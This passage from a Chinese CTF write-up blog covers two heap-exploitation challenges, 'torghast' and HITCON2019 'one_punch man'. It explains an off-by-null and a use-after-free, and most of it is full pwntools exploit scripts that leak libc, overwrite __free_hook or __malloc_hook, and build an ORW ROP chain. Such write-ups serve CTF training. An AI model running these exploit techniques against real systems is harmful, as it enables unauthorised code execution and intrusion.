class="number">3</span>+p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,data + payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size of page :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x10</span>).encode())</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0xf</strong></p><h2 id="2022春秋杯-torghast"><a href="#2022春秋杯-torghast" class="headerlink" title="2022春秋杯-torghast"></a>2022春秋杯-torghast</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>程序要进行攻击的话,首先得成功通关关卡</p><p>需要通关有需要先取得GM权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( a1 == <span class="number">4</span> )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)mp5070[<span class="number">6</span> * dword_504C] &gt; <span class="number">0x5F5E0FE</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     dword_5058 = <span class="number">1</span>;</span><br><span class="line">     LODWORD(v1) = <span class="built_in">puts</span>(<span class="string">&quot;Welcome GAME MASTER&quot;</span>);</span><br></pre></td></tr></table></figure><p>可以看到再进行比较的时候事先将mp转为无符号了</p><p>而在购买其他物品时,只比较了金钱是否大于0,而没有比较是否大于价格</p><p><strong>取得权限:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br></pre></td></tr></table></figure><p>在不合并的前提下释放两个非tcache范围内chunk再取出使他们的bk位置写上堆地址和libc地址,fd位因为一定会被覆盖一些所以不行</p><p>这样就得到了libc地址和堆地址(堆地址用于之后绕过overlap时的unlink)</p><p>程序在edit_player的时候会存在off-by-null漏洞</p><p>可以利用其向前overlap(非tcache chunk)</p><p>从而进一步达到uaf(两个指针指向同一个chunk)</p><p>将free_hook挂载入tcache中,之后取出(注意对应的counts[tc_idx]的值要先拉高)</p><p>之后就是常规的操作了</p><p><strong>exp:</strong></p><p>不知道是不是一开始的交互函数没写好,导致程序交互总是莫名其妙的卡住,五六次使用脚本只有一次符合预期,调试的时候可以说是极其折磨了,折腾了一天</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">game</span>():</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content=<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Size\n&#x27;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Data\n&#x27;</span>,(content))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Change?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Your Log:&#x27;</span>,content)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log</span>(<span class="params">idx</span>):</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;User?\n&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">game()</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x410</span>)<span class="comment">#防止两个chunk合并</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x410</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x410</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x410</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">3</span>)</span><br><span class="line">libc_address=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">log(<span class="number">1</span>)</span><br><span class="line">heap_3=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc.address=libc_address-<span class="number">96</span>-<span class="number">0x1ebb80</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_3))</span><br><span class="line">free_hook=libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">heap_5=heap_3+<span class="number">0x840</span><span class="comment">#调试计算</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap_5))<span class="comment">#记录地址</span></span><br><span class="line">p.recv()</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x18</span>)<span class="comment">#off-by-null</span></span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x4f0</span>)</span><br><span class="line">add(<span class="number">15</span>,<span class="number">0x10</span>)<span class="comment">#防止与topchunk合并</span></span><br><span class="line">edit(<span class="number">5</span>,p64(heap_3-<span class="number">0x8</span>)+p64(heap_3)+p64(<span class="number">0x20</span>))<span class="comment">#绕过合并时的unlink检测,prev_size记得填</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>)<span class="comment">#触发合并</span></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x110</span>)<span class="comment">#现在10和5指向同一个chunk</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x110</span>)<span class="comment">#拉高对应count[idx]</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(free_hook))<span class="comment">#挂载hook</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0x110</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x110</span>,p64(system))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;To Delete:\n&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>小记0x10-0x12</strong></p><h2 id="HITCON2019-one-punch-man"><a href="#HITCON2019-one-punch-man" class="headerlink" title="HITCON2019-one_punch man"></a>HITCON2019-one_punch man</h2><p><strong>难度:★★★</strong></p><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/op&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>and沙盒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x00000000  return KILL</span><br><span class="line"> 0003: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0004: 0x15 0x00 0x01 0x0000000f  if (A != rt_sigreturn) goto 0006</span><br><span class="line"> 0005: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0006: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x15 0x00 0x01 0x0000003c  if (A != exit) goto 0010</span><br><span class="line"> 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0010: 0x15 0x00 0x01 0x00000002  if (A != open) goto 0012</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0012: 0x15 0x00 0x01 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0014: 0x15 0x00 0x01 0x00000001  if (A != write) goto 0016</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0016: 0x15 0x00 0x01 0x0000000c  if (A != brk) goto 0018</span><br><span class="line"> 0017: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0018: 0x15 0x00 0x01 0x00000009  if (A != mmap) goto 0020</span><br><span class="line"> 0019: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0020: 0x15 0x00 0x01 0x0000000a  if (A != mprotect) goto 0022</span><br><span class="line"> 0021: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0022: 0x15 0x00 0x01 0x00000003  if (A != close) goto 0024</span><br><span class="line"> 0023: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0024: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p><strong>主要利用的就是retire这个函数在free后没有置零,从而可以uaf</strong></p><p>程序有一个backdoor函数,但是直接看可以看到其本身也只是常规的申请chunk</p><p>不存在什么特殊功能</p><p>不过这题看正常分配chunk函数用的是calloc</p><p>因此不会直接取出tcache中的chunk</p><p>因此就需要用到backdoor中的malloc去除tcache来进行攻击了</p><p>libc版本是2.29,unsortedbin attack被削废了</p><p>难度不小,看了看师傅们的博客</p><p>主要有两种思路</p><h3 id="思路一"><a href="#思路一" class="headerlink" title="思路一"></a>思路一</h3><p>主要是利用tcache在bins中找到所需的chunk后会将多余的该chunk填充入未满的tcache,来达到类似unsortedbin的攻击方式</p><ol><li>泄露heap基址,libc基址</li><li>利用unsorted切割割出两个small chunk</li><li>uaf写后来的small chunk的bk为目的地址</li><li>申请一个0x220的chunk,利用uaf写fd为__malloc_hook</li><li>申请small chunk,触发放入tcache</li><li>backdoor申请出__malloc_hook</li><li>写__malloc_hook为跳转栈到可控区</li><li>在栈上构造orw_rop流,通过__malloc_hook调用</li></ol><p>small chunk之所以不直接申请对应大小,是因为要使得他能放入small bin就需要tcache满,而tcache满就无法触发放入tcache</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.binary=<span class="string">&#x27;./op&#x27;</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./op&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#some gadgets</span></span><br><span class="line"><span class="comment"># 0x000000000008cfd6: add rsp, 0x48; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000026542: pop rdi; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000012bdcgot9: pop rdx; pop rsi; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment"># 0x00000000000cf6c5: syscall; ret;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line">p=process(<span class="string">&#x27;./op&#x27;</span>)</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">heap_base=u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x260</span></span><br><span class="line">info(<span class="string">&quot;heap : &quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">alloc(i,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">&quot;A&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x300</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">alloc(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x210</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;\x00&quot;</span>*<span class="number">0x108</span>+<span class="string">b&quot;flag.txt&quot;</span>+<span class="string">b&quot;\x00&quot;</span>*(<span class="number">0x8</span>+<span class="number">0x1f0</span>)+p64(<span class="number">0x101</span>)+p64(heap_base+<span class="number">0x27d0</span>)+p64(heap_base+<span class="number">0x30</span>-<span class="number">0x10</span>-<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">cmd(<span class="number">50056</span>)</span><br><span class="line">p.send(<span class="string">b&quot;C&quot;</span>*<span class="number">8</span>)</span><br><span class="line">cmd(<span class="number">50056</span>)</span><br><span class="line">p.send(p64(libc.address+<span class="number">0x000000000008cfd6</span>))</span><br><span class="line">p_rdi = <span class="number">0x0000000000026542</span>+libc.address</span><br><span class="line">p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc.address</span><br><span class="line">p_rax = <span class="number">0x0000000000047cf8</span>+libc.address</span><br><span class="line">syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc.address</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(p_rdi)+p64(heap_base+<span class="number">0x2df8</span>)+p64(p_rdx_rsi)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(p_rax)+p64(<span class="number">2</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap_base+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">payload += 